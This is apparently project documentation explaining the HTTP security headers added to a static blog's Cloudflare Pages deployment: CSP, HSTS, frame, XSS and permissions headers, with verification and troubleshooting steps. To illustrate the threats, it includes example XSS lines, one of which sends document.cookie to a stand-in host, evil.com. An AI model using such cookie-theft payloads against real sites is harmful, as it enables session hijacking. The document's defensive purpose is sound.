# Security Headers Implementation

## Overview

Implemented comprehensive HTTP security headers via Cloudflare Pages `_headers` file to protect against common web vulnerabilities and improve security posture.

## What Was Implemented

### Headers File
Created `_headers` file with 5 critical security headers that will be automatically applied by Cloudflare Pages to all requests.

---

## 🔒 Security Headers Explained

### 1. X-Frame-Options: SAMEORIGIN

**Purpose:** Clickjacking protection  
**What it does:** Prevents your site from being embedded in iframes on other domains

**Attack Prevented:**
```
Evil Site (evil.com):
┌──────────────────────────┐
│ Win a FREE iPhone! ←─────┼─ Fake button overlay
├──────────────────────────┤
│                          │
│  [Your Site Iframe]      │
│  [Real Login Button] ←───┼─ User clicks here thinking
│                          │   it's the fake button
└──────────────────────────┘
   User unknowingly clicks
   real button on your site
```

**With Header:** Browser refuses to load your site in iframe on evil.com ✅

---

### 2. X-XSS-Protection: 1; mode=block

**Purpose:** Legacy XSS protection for older browsers  
**What it does:** Enables built-in XSS filter in older browsers

**Attack Prevented:**
```javascript
// Malicious comment/input:
<script>
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>
```

**With Header:** Older browsers block the page if XSS detected ✅  
**Note:** Modern browsers use CSP instead, but this helps legacy browsers

---

### 3. Strict-Transport-Security (HSTS)

**Purpose:** Force HTTPS for all connections  
**Configuration:** `max-age=31536000; includeSubDomains; preload`

**Attack Prevented:**
```
User types: jameskilby.co.uk
Browser tries: http://jameskilby.co.uk ← insecure!
Attacker intercepts connection (man-in-the-middle)
Attacker steals session cookies
```

**With Header:**  
- Browser ALWAYS uses HTTPS for 1 year (31536000 seconds)
- Applies to all subdomains
- Eligible for HSTS preload list (built into browsers)

**Impact:** After first visit, browser will NEVER attempt HTTP connection ✅

---

###4. Permissions-Policy

**Purpose:** Control access to browser device features  
**Configuration:** Denies all device APIs

**Features Blocked:**
- `geolocation=()` - GPS/location tracking
- `microphone=()` - Microphone access
- `camera=()` - Camera access
- `payment=()` - Payment Request API
- `usb=()` - USB device access
- `magnetometer=()` - Compass sensor
- `gyroscope=()` - Motion sensor

**Why This Matters:**
```javascript
// Malicious script tries to access camera:
navigator.mediaDevices.getUserMedia({video: true})

// With Permissions-Policy:
// ❌ DOMException: Permission denied
```

**Your Site:** Static blog doesn't need any of these features, so deny all ✅

---

### 5. Content-Security-Policy (CSP)

**Purpose:** Most powerful security header - controls ALL resource loading  
**What it does:** Whitelist of allowed sources for scripts, styles, images, etc.

#### Your CSP Configuration Explained

```
Content-Security-Policy: 
  default-src 'self';
  ↑ Default: only load from jameskilby.co.uk
  
  script-src 'self' 'unsafe-inline' plausible.jameskilby.cloud utteranc.es github.com;
  ↑ Scripts allowed from:
    - Your site (self)
    - Inline <script> tags (unsafe-inline - needed for some WordPress features)
    - Plausible Analytics
    - Utterances comments
    - GitHub (for Utterances)
  
  style-src 'self' 'unsafe-inline' github.com;
  ↑ CSS allowed from:
    - Your site
    - Inline styles (needed for WordPress)
    - GitHub (for Utterances styling)
  
  img-src 'self' data: https:;
  ↑ Images allowed from:
    - Your site
    - Data URLs (embedded images)
    - ANY HTTPS source (for external images in blog posts)
  
  font-src 'self' data:;
  ↑ Fonts from your site + embedded fonts only
  
  connect-src 'self' plausible.jameskilby.cloud;
  ↑ AJAX/fetch allowed to your site + Plausible only
  
  frame-src https://www.youtube.com https://player.vimeo.com https://utteranc.es;
  ↑ Iframes ONLY from YouTube, Vimeo, Utterances
  
  object-src 'none';
  ↑ Block <object>, <embed>, <applet> (old, vulnerable tech)
  
  base-uri 'self';
  ↑ <base> tag can only point to your site
  
  form-action 'self';
  ↑ Forms can only submit to your site
  
  frame-ancestors 'self'
  ↑ Your site can only be framed by itself (similar to X-Frame-Options)
```

#### Attack Scenarios Prevented

**Scenario 1: Injected Malicious Script**
```html
<!-- Attacker somehow injects: -->
<script src="https://evil.com/steal-cookies.js"></script>

<!-- CSP blocks it because evil.com is not in script-src whitelist -->
Browser Console: Refused to load script from 'https://evil.com/steal-cookies.js' 
                 because it violates CSP directive: "script-src 'self' ..."
```

**Scenario 2: Malicious Iframe**
```html
<!-- Attacker injects: -->
<iframe src="https://phishing-site.com"></iframe>

<!-- CSP blocks it because not in frame-src whitelist -->
Browser: Refused to frame 'https://phishing-site.com' 
         because it violates CSP directive: "frame-src https://www.youtube.com..."
```

**Scenario 3: External Font Loading (could track users)**
```css
/* Attacker injects CSS: */
@font-face {
  font-family: 'Tracker';
  src: url('https://tracker.com/font.woff?user=123');
}

<!-- CSP blocks it - font-src only allows 'self' and data: -->
```

---

## Implementation Details

### File Location
- **Source:** `wp_to_static_generator.py` → `create_security_headers()` method
- **Output:** `{output_dir}/_headers`
- **Deployment:** Cloudflare Pages automatically reads `_headers` file

### File Format
```
# Comment
/*
  Header-Name: Header-Value
  Another-Header: Another-Value
```

The `/*` applies headers to ALL paths on your site.

### When Headers Are Applied
- Cloudflare Pages reads `_headers` during deployment
- Headers are sent with EVERY HTTP response
- No JavaScript or configuration needed
- Works immediately after deployment

---

## Current vs New Security Status

### Before (2/7 headers)
```
✅ X-Content-Type-Options: nosniff
✅ Referrer-Policy: strict-origin-when-cross-origin
❌ X-Frame-Options: MISSING
❌ Content-Security-Policy: MISSING
❌ Strict-Transport-Security: MISSING
❌ Permissions-Policy: MISSING
❌ X-XSS-Protection: MISSING
```

### After (7/7 headers) ✅
```
✅ X-Content-Type-Options: nosniff (from Cloudflare)
✅ Referrer-Policy: strict-origin-when-cross-origin (from Cloudflare)
✅ X-Frame-Options: SAMEORIGIN (NEW)
✅ Content-Security-Policy: [full policy] (NEW)
✅ Strict-Transport-Security: max-age=31536000 (NEW)
✅ Permissions-Policy: [deny all] (NEW)
✅ X-XSS-Protection: 1; mode=block (NEW)
```

---

## Verification

### After Deployment

**Check headers are present:**
```bash
curl -I https://jameskilby.co.uk/
```

Expected output should include:
```
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Permissions-Policy: geolocation=(), microphone=(), camera=()...
Content-Security-Policy: default-src 'self'; script-src...
```

### Security Testing Tools

**1. SecurityHeaders.com**
```
https://securityheaders.com/?q=https://jameskilby.co.uk
```
Expected grade: **A or A+**

**2. Mozilla Observatory**
```
https://observatory.mozilla.org/analyze/jameskilby.co.uk
```
Expected score: **A+ or 90+**

**3. Chrome DevTools**
- Open site → DevTools → Console
- Look for CSP violations (should be none if configured correctly)

**4. CSP Evaluator**
```
https://csp-evaluator.withgoogle.com/
```
Paste your CSP to check for issues

---

## Troubleshooting

### Issue: Site Features Broken After Deployment

**Symptoms:**
- Images not loading
- Videos not playing  
- Comments not working

**Check Browser Console:**
```
Refused to load ... because it violates CSP directive: "..."
```

**Solution:** Add the blocked domain to appropriate CSP directive

**Example:** If Acast podcasts break:
```
# Add to CSP in wp_to_static_generator.py:
frame-src https://www.youtube.com https://player.vimeo.com https://utteranc.es https://embed.acast.com;
```

### Issue: HSTS Causing Problems

**Symptoms:**
- Can't access site over HTTP (even for testing)
- "This site can't provide a secure connection" error

**Cause:** HSTS forces HTTPS for 1 year after first visit

**Solution for Testing:**
1. Chrome: chrome://net-internals/#hsts → Delete domain
2. Firefox: Clear browsing data → Cookies and site data
3. Safari: Clear website data for domain

**For Production:** This is expected behavior! HSTS is working correctly.

### Issue: CSP Violations in Console

**Example Error:**
```
Refused to load script from 'https://example.com/script.js' 
because it violates the following Content Security Policy directive: "script-src 'self'..."
```

**Solution:**
1. Identify if the script is necessary
2. If yes, add to whitelist in CSP
3. If no, remove the script from your site

---

## Maintenance

### Adding New External Services

If you add new third-party services, update CSP in `wp_to_static_generator.py`:

**Example: Adding Google Fonts**
```python
# In create_security_headers() method:
"  Content-Security-Policy: default-src 'self'; "
"script-src 'self' 'unsafe-inline' plausible.jameskilby.cloud utteranc.es github.com; "
"style-src 'self' 'unsafe-inline' github.com fonts.googleapis.com; "  # Added fonts.googleapis.com
"font-src 'self' data: fonts.gstatic.com; "  # Added fonts.gstatic.com
```

### Testing CSP Changes

1. Update CSP in code
2. Generate site locally: `python3 wp_to_static_generator.py ./test-output`
3. Test locally: `python3 -m http.server 8000 --directory ./test-output`
4. Open site with DevTools Console
5. Check for CSP violations
6. Iterate until no violations
7. Deploy

### CSP Report-Only Mode (for testing)

To test CSP without breaking site, use report-only mode:

```
Content-Security-Policy-Report-Only: default-src 'self'; ...
```

This logs violations to console without blocking anything.

---

## Security Score Improvements

### Expected Results After Implementation

**SecurityHeaders.com:**
- Before: D or F
- After: **A or A+**

**Mozilla Observatory:**
- Before: 20-40/100
- After: **90+/100**

**Lighthouse Security Audit:**
- Before: Issues with missing headers
- After: ✅ All security best practices

---

## Advanced: HSTS Preload

### What is HSTS Preload?

A list built into browsers of sites that should ALWAYS use HTTPS, even on first visit.

### Benefits
- Protection even on first visit (before HSTS header received)
- Your site permanently in Chrome, Firefox, Safari, Edge

### Requirements Met ✅
- [x] HSTS header with `max-age=31536000` (1 year)
- [x] `includeSubDomains` directive
- [x] `preload` directive  
- [x] Valid certificate
- [x] All subdomains support HTTPS

### To Submit for Preload
1. Verify all requirements: https://hstspreload.org/
2. Submit your domain: https://hstspreload.org/
3. Wait 6-12 weeks for inclusion in browsers

**Warning:** Hard to remove once submitted! Make sure HTTPS works perfectly first.

---

## Performance Impact

**Page Load Time:** None - headers sent with response, no extra requests  
**Size Impact:** ~300 bytes per response (headers)  
**CDN Impact:** Cloudflare handles headers efficiently  
**Browser Impact:** Minimal - modern browsers optimized for CSP

---

## References

### Specifications
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: HTTP Strict Transport Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)

### Tools
- [SecurityHeaders.com](https://securityheaders.com/)
- [Mozilla Observatory](https://observatory.mozilla.org/)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [HSTS Preload](https://hstspreload.org/)

### Cloudflare Docs
- [Custom Headers](https://developers.cloudflare.com/pages/platform/headers/)
- [_headers file format](https://developers.cloudflare.com/pages/platform/headers/#syntax)

---

## Related Documentation
- `DNS_PREFETCH_OPTIMIZATION.md` - Performance hints
- `THEME_COLOR_IMPLEMENTATION.md` - Mobile UX
- `PLAUSIBLE_ANALYTICS.md` - Analytics (allowed in CSP)

## Commit Reference
- **Commit:** f704963c
- **Date:** 2025-12-17
- **Title:** "Add security headers via _headers file for Cloudflare Pages"
